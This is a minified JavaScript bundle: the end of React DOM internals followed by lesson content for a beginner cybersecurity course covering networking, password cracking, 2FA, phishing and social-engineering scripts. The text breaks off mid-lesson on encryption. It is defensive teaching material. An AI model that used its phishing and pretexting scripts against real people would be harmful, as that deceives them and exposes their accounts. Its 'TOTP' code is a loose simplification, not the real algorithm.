e.stylesheets&&e.count===0&&wu(e,e.stylesheets),0<e.count||0<e.imgCount?function(l){var a=setTimeout(function(){if(e.stylesheets&&wu(e,e.stylesheets),e.unsuspend){var u=e.unsuspend;e.unsuspend=null,u()}},6e4+t);0<e.imgBytes&&ts===0&&(ts=62500*Oy());var n=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&wu(e,e.stylesheets),e.unsuspend)){var u=e.unsuspend;e.unsuspend=null,u()}},(e.imgBytes>ts?50:800)+t);return e.unsuspend=l,function(){e.unsuspend=null,clearTimeout(a),clearTimeout(n)}}:null}function Uu(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)wu(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Ru=null;function wu(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Ru=new Map,t.forEach(Zy,e),Ru=null,Uu.call(e))}function Zy(e,t){if(!(t.state.loading&4)){var l=Ru.get(e);if(l)var a=l.get(null);else{l=new Map,Ru.set(e,l);for(var n=e.querySelectorAll("link[data-precedence],style[data-precedence]"),u=0;u<n.length;u++){var i=n[u];(i.nodeName==="LINK"||i.getAttribute("media")!=="not all")&&(l.set(i.dataset.precedence,i),a=i)}a&&l.set(null,a)}n=t.instance,i=n.getAttribute("data-precedence"),u=l.get(i)||a,u===a&&l.set(null,n),l.set(i,n),this.count++,a=Uu.bind(this),n.addEventListener("load",a),n.addEventListener("error",a),u?u.parentNode.insertBefore(n,u.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(n,e.firstChild)),t.state.loading|=4}}var pn={$$typeof:Ee,Provider:null,Consumer:null,_currentValue:q,_currentValue2:q,_threadCount:0};function Ky(e,t,l,a,n,u,i,c,s){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Fu(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Fu(0),this.hiddenUpdates=Fu(null),this.identifierPrefix=a,this.onUncaughtError=n,this.onCaughtError=u,this.onRecoverableError=i,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=s,this.incompleteTransitions=new Map}function ud(e,t,l,a,n,u,i,c,s,h,p,T){return e=new Ky(e,t,l,i,s,h,p,T,c),t=1,u===!0&&(t|=24),u=ut(3,null,null,t),e.current=u,u.stateNode=e,t=Ri(),t.refCount++,e.pooledCache=t,t.refCount++,u.memoizedState={element:a,isDehydrated:l,cache:t},Yi(u),e}function id(e){return e?(e=aa,e):aa}function cd(e,t,l,a,n,u){n=id(n),a.context===null?a.context=n:a.pendingContext=n,a=cl(t),a.payload={element:l},u=u===void 0?null:u,u!==null&&(a.callback=u),l=sl(e,a,t),l!==null&&(Pe(l,e,t),Wa(l,e,t))}function sd(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var l=e.retryLane;e.retryLane=l!==0&&l<t?l:t}}function ls(e,t){sd(e,t),(e=e.alternate)&&sd(e,t)}function fd(e){if(e.tag===13||e.tag===31){var t=Ml(e,67108864);t!==null&&Pe(t,e,67108864),ls(e,67108864)}}function od(e){if(e.tag===13||e.tag===31){var t=ot();t=$u(t);var l=Ml(e,t);l!==null&&Pe(l,e,t),ls(e,t)}}var ju=!0;function Jy(e,t,l,a){var n=S.T;S.T=null;var u=O.p;try{O.p=2,as(e,t,l,a)}finally{O.p=u,S.T=n}}function Wy(e,t,l,a){var n=S.T;S.T=null;var u=O.p;try{O.p=8,as(e,t,l,a)}finally{O.p=u,S.T=n}}function as(e,t,l,a){if(ju){var n=ns(a);if(n===null)Xc(e,t,a,Bu,l),dd(e,a);else if($y(n,e,t,l,a))a.stopPropagation();else if(dd(e,a),t&4&&-1<Fy.indexOf(e)){for(;n!==null;){var u=Zl(n);if(u!==null)switch(u.tag){case 3:if(u=u.stateNode,u.current.memoizedState.isDehydrated){var i=Cl(u.pendingLanes);if(i!==0){var c=u;for(c.pendingLanes|=2,c.entangledLanes|=2;i;){var s=1<<31-at(i);c.entanglements[1]|=s,i&=~s}Ut(u),(ne&6)===0&&(Su=tt()+500,dn(0))}}break;case 31:case 13:c=Ml(u,2),c!==null&&Pe(c,u,2),Tu(),ls(u,2)}if(u=ns(a),u===null&&Xc(e,t,a,Bu,l),u===n)break;n=u}n!==null&&a.stopPropagation()}else Xc(e,t,a,null,l)}}function ns(e){return e=ii(e),us(e)}var Bu=null;function us(e){if(Bu=null,e=Vl(e),e!==null){var t=K(e);if(t===null)e=null;else{var l=t.tag;if(l===13){if(e=ue(t),e!==null)return e;e=null}else if(l===31){if(e=Ae(t),e!==null)return e;e=null}else if(l===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return Bu=e,null}function rd(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(wd()){case vs:return 2;case ps:return 8;case Cn:case jd:return 32;case Ss:return 268435456;default:return 32}default:return 32}}var is=!1,Sl=null,bl=null,Tl=null,Sn=new Map,bn=new Map,Al=[],Fy="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function dd(e,t){switch(e){case"focusin":case"focusout":Sl=null;break;case"dragenter":case"dragleave":bl=null;break;case"mouseover":case"mouseout":Tl=null;break;case"pointerover":case"pointerout":Sn.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":bn.delete(t.pointerId)}}function Tn(e,t,l,a,n,u){return e===null||e.nativeEvent!==u?(e={blockedOn:t,domEventName:l,eventSystemFlags:a,nativeEvent:u,targetContainers:[n]},t!==null&&(t=Zl(t),t!==null&&fd(t)),e):(e.eventSystemFlags|=a,t=e.targetContainers,n!==null&&t.indexOf(n)===-1&&t.push(n),e)}function $y(e,t,l,a,n){switch(t){case"focusin":return Sl=Tn(Sl,e,t,l,a,n),!0;case"dragenter":return bl=Tn(bl,e,t,l,a,n),!0;case"mouseover":return Tl=Tn(Tl,e,t,l,a,n),!0;case"pointerover":var u=n.pointerId;return Sn.set(u,Tn(Sn.get(u)||null,e,t,l,a,n)),!0;case"gotpointercapture":return u=n.pointerId,bn.set(u,Tn(bn.get(u)||null,e,t,l,a,n)),!0}return!1}function hd(e){var t=Vl(e.target);if(t!==null){var l=K(t);if(l!==null){if(t=l.tag,t===13){if(t=ue(l),t!==null){e.blockedOn=t,Os(e.priority,function(){od(l)});return}}else if(t===31){if(t=Ae(l),t!==null){e.blockedOn=t,Os(e.priority,function(){od(l)});return}}else if(t===3&&l.stateNode.current.memoizedState.isDehydrated){e.blockedOn=l.tag===3?l.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Yu(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var l=ns(e.nativeEvent);if(l===null){l=e.nativeEvent;var a=new l.constructor(l.type,l);ui=a,l.target.dispatchEvent(a),ui=null}else return t=Zl(l),t!==null&&fd(t),e.blockedOn=l,!1;t.shift()}return!0}function yd(e,t,l){Yu(e)&&l.delete(t)}function Iy(){is=!1,Sl!==null&&Yu(Sl)&&(Sl=null),bl!==null&&Yu(bl)&&(bl=null),Tl!==null&&Yu(Tl)&&(Tl=null),Sn.forEach(yd),bn.forEach(yd)}function qu(e,t){e.blockedOn===t&&(e.blockedOn=null,is||(is=!0,z.unstable_scheduleCallback(z.unstable_NormalPriority,Iy)))}var Lu=null;function md(e){Lu!==e&&(Lu=e,z.unstable_scheduleCallback(z.unstable_NormalPriority,function(){Lu===e&&(Lu=null);for(var t=0;t<e.length;t+=3){var l=e[t],a=e[t+1],n=e[t+2];if(typeof a!="function"){if(us(a||l)===null)continue;break}var u=Zl(l);u!==null&&(e.splice(t,3),t-=3,nc(u,{pending:!0,data:n,method:l.method,action:a},a,n))}}))}function _a(e){function t(s){return qu(s,e)}Sl!==null&&qu(Sl,e),bl!==null&&qu(bl,e),Tl!==null&&qu(Tl,e),Sn.forEach(t),bn.forEach(t);for(var l=0;l<Al.length;l++){var a=Al[l];a.blockedOn===e&&(a.blockedOn=null)}for(;0<Al.length&&(l=Al[0],l.blockedOn===null);)hd(l),l.blockedOn===null&&Al.shift();if(l=(e.ownerDocument||e).$$reactFormReplay,l!=null)for(a=0;a<l.length;a+=3){var n=l[a],u=l[a+1],i=n[Ke]||null;if(typeof u=="function")i||md(l);else if(i){var c=null;if(u&&u.hasAttribute("formAction")){if(n=u,i=u[Ke]||null)c=i.formAction;else if(us(n)!==null)continue}else c=i.action;typeof c=="function"?l[a+1]=c:(l.splice(a,3),a-=3),md(l)}}}function gd(){function e(u){u.canIntercept&&u.info==="react-transition"&&u.intercept({handler:function(){return new Promise(function(i){return n=i})},focusReset:"manual",scroll:"manual"})}function t(){n!==null&&(n(),n=null),a||setTimeout(l,20)}function l(){if(!a&&!navigation.transition){var u=navigation.currentEntry;u&&u.url!=null&&navigation.navigate(u.url,{state:u.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var a=!1,n=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(l,100),function(){a=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),n!==null&&(n(),n=null)}}}function cs(e){this._internalRoot=e}ku.prototype.render=cs.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(y(409));var l=t.current,a=ot();cd(l,a,e,t,null,null)},ku.prototype.unmount=cs.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;cd(e.current,2,null,e,null,null),Tu(),t[Ql]=null}};function ku(e){this._internalRoot=e}ku.prototype.unstable_scheduleHydration=function(e){if(e){var t=zs();e={blockedOn:null,target:e,priority:t};for(var l=0;l<Al.length&&t!==0&&t<Al[l].priority;l++);Al.splice(l,0,e),l===0&&hd(e)}};var vd=L.version;if(vd!=="19.2.4")throw Error(y(527,vd,"19.2.4"));O.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(y(188)):(e=Object.keys(e).join(","),Error(y(268,e)));return e=E(t),e=e!==null?P(e):null,e=e===null?null:e.stateNode,e};var Py={bundleType:0,version:"19.2.4",rendererPackageName:"react-dom",currentDispatcherRef:S,reconcilerVersion:"19.2.4"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Gu=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Gu.isDisabled&&Gu.supportsFiber)try{Ha=Gu.inject(Py),lt=Gu}catch{}}return En.createRoot=function(e,t){if(!U(e))throw Error(y(299));var l=!1,a="",n=zo,u=Oo,i=Co;return t!=null&&(t.unstable_strictMode===!0&&(l=!0),t.identifierPrefix!==void 0&&(a=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(u=t.onCaughtError),t.onRecoverableError!==void 0&&(i=t.onRecoverableError)),t=ud(e,1,!1,null,null,l,a,null,n,u,i,gd),e[Ql]=t.current,Gc(e),new cs(t)},En.hydrateRoot=function(e,t,l){if(!U(e))throw Error(y(299));var a=!1,n="",u=zo,i=Oo,c=Co,s=null;return l!=null&&(l.unstable_strictMode===!0&&(a=!0),l.identifierPrefix!==void 0&&(n=l.identifierPrefix),l.onUncaughtError!==void 0&&(u=l.onUncaughtError),l.onCaughtError!==void 0&&(i=l.onCaughtError),l.onRecoverableError!==void 0&&(c=l.onRecoverableError),l.formState!==void 0&&(s=l.formState)),t=ud(e,1,!0,t,l??null,a,n,s,u,i,c,gd),t.context=id(null),l=t.current,a=ot(),a=$u(a),n=cl(a),n.callback=null,sl(l,n,a),l=a,t.current.lanes=l,Ma(t,l),Ut(t),e[Ql]=t.current,Gc(e),new ku(t)},En.version="19.2.4",En}var _d;function fm(){if(_d)return os.exports;_d=1;function z(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(z)}catch(L){console.error(L)}}return z(),os.exports=sm(),os.exports}var om=fm();const _t={chapters:[{id:1,title:"Welcome to Cybersecurity",description:"What hackers do and why it matters",lessons:[{id:"1-1",title:"What is Cybersecurity?",duration:"8 min",content:`
## Welcome, Future Cyber Defender! 🛡️

Every day, hackers attack millions of computers, phones, and websites. **Cybersecurity** is the art of defending against these attacks — and understanding how they work.

### Why Should You Care?

Think about everything connected to the internet:
- Your phone 📱
- Your gaming console 🎮
- Smart TVs, cameras, doorbells 📷
- Cars, hospitals, power plants ⚡

ALL of these can be hacked. And someone needs to protect them.

### The Three Types of Hackers

| Type | Also Called | What They Do |
|------|-----------|-------------|
| **White Hat** | Ethical Hacker | Gets paid to find & fix security holes |
| **Black Hat** | Criminal Hacker | Breaks into systems illegally |
| **Gray Hat** | Somewhere in between | Finds bugs without permission, but reports them |

### What You'll Learn

In this course, you'll think like a hacker (the good kind!):

✅ How passwords get cracked
✅ How websites get hacked
✅ How to spot phishing scams
✅ How to protect your accounts
✅ How encryption works
✅ How to analyze network traffic
✅ Real hacking tools (used ethically!)

### The CIA Triad

The foundation of all cybersecurity:

- **C**onfidentiality — Only authorized people see the data
- **I**ntegrity — Data hasn't been tampered with
- **A**vailability — Systems are up and running when needed

\`\`\`
       Confidentiality
           /\\
          /  \\
         /    \\
        /  CIA  \\
       /________\\
  Integrity    Availability
\`\`\`

Every security decision balances these three goals.

### Real-World Cyber Attacks

| Attack | Year | What Happened |
|--------|------|--------------|
| Yahoo Breach | 2013 | 3 billion accounts stolen |
| WannaCry | 2017 | Ransomware hit 200,000 computers |
| SolarWinds | 2020 | Hackers infiltrated US government |
| Colonial Pipeline | 2021 | Shut down fuel supply for days |

<tip>
💡 Cybersecurity jobs pay $80,000-$200,000+ and there's a massive shortage of skilled workers!
</tip>

### The Golden Rule

**Never hack anything you don't have permission to hack.**

This course teaches you skills for defense and ethical hacking ONLY. Using these skills illegally can land you in serious trouble.

Ready to become a cyber defender? Let's go! 🚀
          `},{id:"1-2",title:"How the Internet Actually Works",duration:"10 min",content:`
## Under the Hood of the Internet 🌐

To defend the internet, you need to understand how it works!

### IP Addresses — Your Digital Address

Every device on the internet has an **IP address**:

\`\`\`
Your computer:  192.168.1.100  (private/local)
Google's server: 142.250.80.46  (public)
\`\`\`

**IPv4**: 4 numbers, 0-255 each → \`192.168.1.1\`
**IPv6**: Longer, newer format → \`2001:0db8:85a3::8a2e:0370:7334\`

### DNS — The Internet's Phone Book

When you type \`google.com\`, your computer asks a **DNS server**: "What's the IP for google.com?"

\`\`\`
You → "What IP is google.com?"
DNS → "It's 142.250.80.46"
You → connects to 142.250.80.46
\`\`\`

\`\`\`bash
# Try it yourself! Open terminal and type:
nslookup google.com

# Or:
ping google.com
\`\`\`

### Ports — Doors Into a Computer

Each computer has **65,535 ports**. Think of them as doors:

| Port | Service | What It Does |
|------|---------|-------------|
| 80 | HTTP | Regular websites |
| 443 | HTTPS | Secure websites |
| 22 | SSH | Remote access |
| 25 | SMTP | Email sending |
| 3306 | MySQL | Databases |

<warning>
⚠️ Open ports are like unlocked doors — hackers scan for them!
</warning>

### HTTP vs HTTPS

\`\`\`
HTTP  = Sending a postcard (anyone can read it)
HTTPS = Sending a sealed letter (encrypted!)
\`\`\`

Always check for the 🔒 lock icon in your browser!

### Packets — How Data Travels

Data doesn't travel as one big file. It's broken into **packets**:

\`\`\`
Your message: "Hello World!"

Split into packets:
[Packet 1] "Hel" → Route A → ✓
[Packet 2] "lo "  → Route B → ✓
[Packet 3] "Wor" → Route A → ✓
[Packet 4] "ld!" → Route C → ✓

Reassembled: "Hello World!"
\`\`\`

Each packet contains:
- **Source IP** — Where it came from
- **Destination IP** — Where it's going
- **Data** — The actual content
- **Checksum** — Verify it wasn't corrupted

### The OSI Model (Simplified)

\`\`\`
7. Application  ← You interact here (browser, email)
6. Presentation ← Data formatting (encryption)
5. Session      ← Connection management
4. Transport    ← TCP/UDP (reliable delivery)
3. Network      ← IP addresses, routing
2. Data Link    ← MAC addresses, switches
1. Physical     ← Cables, Wi-Fi signals
\`\`\`

<tip>
💡 Hackers can attack at ANY layer. That's why security needs to cover all of them!
</tip>

### Try It: See Your Network Info

\`\`\`bash
# Windows
ipconfig

# Mac/Linux
ifconfig
# or
ip addr

# See your public IP
curl ifconfig.me
\`\`\`

Understanding networking is the foundation of cybersecurity! 🎯
          `}]},{id:2,title:"Passwords & Authentication",description:"How passwords get cracked and how to stay safe",lessons:[{id:"2-1",title:"How Passwords Get Cracked",duration:"12 min",content:`
## Password Cracking 101 🔓

Passwords are the #1 way we protect accounts. And the #1 thing hackers target.

### How Passwords Are Stored

Websites DON'T store your actual password (usually). They store a **hash**:

\`\`\`
Your password: "minecraft123"
        ↓ Hash Function (SHA-256)
Stored hash: "a1b2c3d4e5f6789..."
\`\`\`

A hash is a one-way function — you can't reverse it to get the password back.

\`\`\`python
# Python example of hashing
import hashlib

password = "minecraft123"
hashed = hashlib.sha256(password.encode()).hexdigest()
print(hashed)
# Output: a1b2c3d4e5f6... (always the same for same input!)
\`\`\`

### Attack #1: Brute Force

Try EVERY possible combination:

\`\`\`
Trying: a        ✗
Trying: b        ✗
Trying: c        ✗
...
Trying: aa       ✗
Trying: ab       ✗
...
(This takes forever for long passwords!)
\`\`\`

| Password Length | Possible Combos | Time to Crack |
|----------------|----------------|--------------|
| 4 characters | 14 million | Instant |
| 6 characters | 19 billion | Seconds |
| 8 characters | 6 trillion | Hours |
| 12 characters | 95 sextillion | Centuries |
| 16 characters | ... | Heat death of universe |

### Attack #2: Dictionary Attack

Use a list of common passwords:

\`\`\`
password       ✗
123456         ✗
qwerty         ✗
minecraft123   ✓ FOUND!
\`\`\`

### The Most Common Passwords (DON'T use these!)

1. 123456
2. password
3. 123456789
4. qwerty
5. abc123
6. password1
7. iloveyou
8. 12345678

<warning>
⚠️ If your password is on this list, change it RIGHT NOW!
</warning>

### Attack #3: Rainbow Tables

Pre-computed hashes for millions of passwords:

\`\`\`
"password"    → 5e884898da28047...
"123456"      → 8d969eef6ecad3c...
"minecraft"   → 7c9e7c1b2d4f8a1...
\`\`\`

Hackers just look up the hash! That's why websites use **salting**:

\`\`\`
password + random_salt → unique_hash
"minecraft" + "x7k2" → "completely_different_hash"
"minecraft" + "p9m1" → "another_different_hash"
\`\`\`

Same password, different salt = different hash. Rainbow tables become useless!

### Attack #4: Credential Stuffing

1. Hacker gets leaked passwords from Site A
2. Tries same email/password on Site B, C, D...
3. People reuse passwords → accounts get hacked

<tip>
💡 This is why you should NEVER reuse passwords across different sites!
</tip>

### How to Make Strong Passwords

**Bad:** \`minecraft123\` (dictionary word + numbers)
**Better:** \`M!n3cr@ft_2024!\` (substitutions)
**Best:** \`correct-horse-battery-staple\` (passphrase!)

Passphrases are:
- Easy to remember
- Hard to crack
- Long = more secure

\`\`\`
4 random words = 20+ characters = extremely secure
"purple-elephant-dancing-tuesday"
\`\`\`

You now understand how hackers crack passwords! 🎓
          `},{id:"2-2",title:"Two-Factor Authentication",duration:"8 min",content:`
## The Extra Lock on Your Door 🔐

Even the strongest password can be stolen. That's where **2FA** comes in!

### What is 2FA?

Two-Factor Authentication requires TWO things to log in:

\`\`\`
Factor 1: Something you KNOW (password)
    +
Factor 2: Something you HAVE (phone/key)
    =
Much harder to hack!
\`\`\`

### Types of 2FA

| Method | Security | Convenience |
|--------|----------|------------|
| SMS Code | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| Authenticator App | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Hardware Key (YubiKey) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Biometric (fingerprint) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### Why SMS 2FA is Weak

**SIM Swapping Attack:**
1. Hacker calls your phone carrier
2. Pretends to be you
3. Transfers your number to their SIM
4. Now THEY get your SMS codes!

\`\`\`
Hacker: "Hi, I lost my phone. Can you transfer 
         my number to this new SIM?"
Carrier: "Sure! What's your mother's maiden name?"
Hacker: (found it on social media) "Smith"
Carrier: "Done!"
Your 2FA codes: → Hacker's phone 😱
\`\`\`

### Authenticator Apps (Recommended!)

Apps like **Google Authenticator** or **Authy** generate codes that change every 30 seconds:

\`\`\`
Your app shows: 847 291
                ████████░░ (25 seconds left)

After 30 seconds: 163 502
                  ██░░░░░░░░ (new code!)
\`\`\`

### How TOTP Works

\`\`\`
Secret Key (shared once) + Current Time
        ↓
    HMAC Algorithm
        ↓
    6-digit code
\`\`\`

\`\`\`python
# Simplified TOTP concept
import time
import hashlib

secret = "JBSWY3DPEHPK3PXP"
time_step = int(time.time() / 30)  # Changes every 30 sec
code = hashlib.sha1(f"{secret}{time_step}".encode()).hexdigest()[-6:]
print(f"Your code: {code}")
\`\`\`

### Hardware Security Keys

Physical USB keys (like YubiKey):
- Plug in and tap to authenticate
- **Impossible** to phish remotely
- Used by Google employees (zero phishing since adoption!)

### Set Up 2FA NOW!

Priority accounts to protect:
1. **Email** (password reset for everything!)
2. **Banking/Financial**
3. **Social Media**
4. **Gaming accounts** (Steam, etc.)

<tip>
💡 Always save your **backup codes** when setting up 2FA! Store them somewhere safe offline.
</tip>

### Password Managers

Use one to generate and store unique passwords:
- **Bitwarden** (free, open source)
- **1Password** (paid, great UI)
- **KeePass** (free, local only)

\`\`\`
Without manager: Same password everywhere 😰
With manager: Unique 24-char password per site 💪
\`\`\`

You only need to remember ONE master password!

Enable 2FA on everything. It's the single best thing you can do for security! 🔐
          `}]},{id:3,title:"Social Engineering",description:"Hacking the human mind",lessons:[{id:"3-1",title:"Phishing Attacks",duration:"10 min",content:`
## The Art of Deception 🎣

The easiest way to hack someone? **Ask them for their password.** Seriously.

### What is Phishing?

Fake emails/messages that trick you into giving up information:

\`\`\`
From: security@amaz0n.com  ← Notice the ZERO!
Subject: Your account has been compromised!

Dear Customer,

We detected suspicious activity. Click here to 
verify your identity immediately or your account 
will be suspended in 24 hours!

[VERIFY NOW] ← Links to fake-amazon-login.com
\`\`\`

### Spot the Red Flags 🚩

1. **Urgency** — "Act NOW or else!"
2. **Fear** — "Your account is compromised!"
3. **Bad sender** — \`security@amaz0n.com\` (not amazon.com)
4. **Suspicious links** — Hover before clicking!
5. **Grammar errors** — "Dear Valued Customers"
6. **Generic greeting** — "Dear Customer" not your name
7. **Too good to be true** — "You won $1,000,000!"

### Types of Phishing

| Type | Target | Example |
|------|--------|---------|
| **Phishing** | Anyone | Mass fake emails |
| **Spear Phishing** | Specific person | Researched, personalized |
| **Whaling** | CEO/executives | High-value targets |
| **Smishing** | Via SMS | "Your package is delayed" |
| **Vishing** | Via phone call | "This is the IRS..." |

### Real Phishing Examples

**Fake Login Page:**
\`\`\`
Real:  https://accounts.google.com/login
Fake:  https://accounts.g00gle.com/login  ← zeros!
Fake:  https://google-accounts-login.com  ← wrong domain!
Fake:  https://accounts.google.com.evil.com/login ← subdomain trick!
\`\`\`

**URL Anatomy:**
\`\`\`
https://accounts.google.com.evil.com/login
         ↑                    ↑
    looks legit          ACTUAL domain is evil.com!
\`\`\`

<warning>
⚠️ Always check the ACTUAL domain — it's the part right before .com/.org/.net!
</warning>

### How to Check a Suspicious Email

\`\`\`
1. Don't click any links!
2. Check the sender's FULL email address
3. Hover over links to see real URL
4. Look for urgency/fear tactics
5. When in doubt, go directly to the website
   (type it yourself, don't click the link)
\`\`\`

### Phishing Quiz

Which URL is real?

\`\`\`
A) https://www.paypal.com/login
B) https://www.paypa1.com/login
C) https://paypal.secure-login.com
D) https://www.paypal.com.verify.net/login
\`\`\`

Answer: **A** — it's the only one with the real paypal.com domain!

<tip>
💡 When in doubt, NEVER click email links. Open your browser and type the website address yourself!
</tip>

### Social Media Phishing

Hackers use info from your profiles to make convincing attacks:

\`\`\`
Public info they find:
- Your school name
- Your pet's name
- Your birthday
- Your friends list
- Where you work

They use this to:
- Guess security questions
- Create targeted phishing
- Impersonate your friends
\`\`\`

Stay skeptical! If something feels off, it probably is. 🎯
          `},{id:"3-2",title:"Social Engineering Tactics",duration:"10 min",content:`
## Hacking Without Code 🧠

**Social engineering** is manipulating people into breaking security. No code needed!

### The 6 Principles of Influence

Hackers exploit these psychological principles:

**1. Authority**
\`\`\`
"Hi, I'm from the IT department. I need your 
password to fix a critical issue."
→ People obey authority figures
\`\`\`

**2. Urgency**
\`\`\`
"Your account will be deleted in 1 HOUR unless 
you verify RIGHT NOW!"
→ Panic overrides critical thinking
\`\`\`

**3. Social Proof**
\`\`\`
"Everyone in your department has already updated 
their passwords using this link."
→ If others did it, it must be safe
\`\`\`

**4. Reciprocity**
\`\`\`
"I helped fix your computer last week, remember? 
I just need a small favor..."
→ We feel obligated to return favors
\`\`\`

**5. Liking**
\`\`\`
"Hey! We met at the conference, right? Great 
presentation! By the way..."
→ We trust people we like
\`\`\`

**6. Scarcity**
\`\`\`
"Only the first 10 people get free access! 
Click now before it's gone!"
→ Fear of missing out
\`\`\`

### Real Attack: Tailgating

Following someone through a locked door:

\`\`\`
*Employee badges into building*
Hacker: "Oh hey, can you hold the door? 
         My hands are full!" 📦
Employee: "Sure!"
Hacker: *walks right into secure building*
\`\`\`

### Real Attack: Pretexting

Creating a fake scenario:

\`\`\`
Hacker calls reception:
"Hi, I'm from Cisco doing a network audit. 
I need the admin password for router 
configuration check."

Receptionist: "Oh, let me ask... 
The admin password is 'cisco123'"
\`\`\`

### Real Attack: Baiting

Leaving infected USB drives in parking lots:

\`\`\`
*Employee finds USB labeled "Salary Data 2024"*
Employee: "Ooh, interesting!" *plugs it in*
USB: *installs malware* 😈
\`\`\`

<warning>
⚠️ NEVER plug in USB drives you find! They could contain malware that runs automatically.
</warning>

### Real Attack: Quid Pro Quo

\`\`\`
Hacker calls employees randomly:
"Hi, I'm tech support. Are you having 
any computer problems?"

Employee: "Actually, yes! My email is slow."

Hacker: "I can fix that! Just install this 
remote access tool and give me your login..."
\`\`\`

### Defense Strategies

\`\`\`
✅ Verify identity independently
   (Call them back on a known number)

✅ Never give passwords over phone/email
   (IT will NEVER ask for your password)

✅ Question urgency
   ("Let me verify this first")

✅ Be suspicious of unsolicited help

✅ Report suspicious contacts
\`\`\`

<tip>
💡 The best defense against social engineering is awareness. Now that you know these tricks, they're much less likely to work on you!
</tip>

### Try This: Social Engineering Awareness

Next time you get a suspicious email or message:
1. Identify which principle(s) of influence it uses
2. Find the red flags
3. Think about what the attacker wants

Practice makes you harder to hack! 🛡️
          `}]},{id:4,title:"Encryption & Cryptography",description:"The math that keeps secrets safe",lessons:[{id:"4-1",title:"Encryption Basics",duration:"12 min",content:`
## Secret Messages 🔐

Encryption turns readable text into unreadable gibberish — and back again!

### Plaintext vs Ciphertext

\`\`\`
Plaintext:  "HELLO WORLD"     (readable)
     ↓ Encrypt with key
Ciphertext: "KHOOR ZRUOG"     (gibberish)
     ↓ Decrypt with key
Plaintext:  "HELLO WORLD"     (readable again!)
\`\`\`

### Caesar Cipher (The Oldest Encryption)

Shift each letter by N positions:

\`\`\`
Key: Shift by 3

A → D    H → K
B → E    E → H
C → F    L → O
...      O → R

HELLO → KHOOR
\`\`\`

\`\`\`python
# Caesar Cipher in Python
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# Encrypt
secret = caesar_encrypt("HELLO WORLD", 3)
print(secret)  # KHOOR ZRUOG

# Decrypt (shift backwards)
original = caesar_encrypt(secret, -3)
print(original)  # HELLO WORLD
\`\`\`

### Why Caesar Cipher is Weak

Only 26 possible shifts — try them all!

\`\`\`
KHOOR → shift 1  → JGNNQ  ✗
KHOOR → shift 2  → IFMMP  ✗
KHOOR → shift 3  → HELLO  ✓ Found it!
\`\`\`

### Symmetric Encryption

Same key to encrypt AND decrypt:

\`\`\`
    Key: "mysecretkey"
         ↓
Alice ──[Encrypt]──→ Ciphertext ──[Decrypt]──→ Bob
         ↑                                      ↑
    Uses same key                          Uses same key
\`\`\`

Modern symmetric algorithms:
- **AES** (Advanced Encryption Standard) — The gold standard
- **ChaCha20** — Fast, used in HTTPS

### Asymmetric Encryption (Public Key)

TWO different keys — a public key and a private key:

\`\`\`
Bob has:
  🔑 Public Key  (shared with everyone)
  🗝️ Private Key (kept secret!)

Alice wants to send Bob a message:
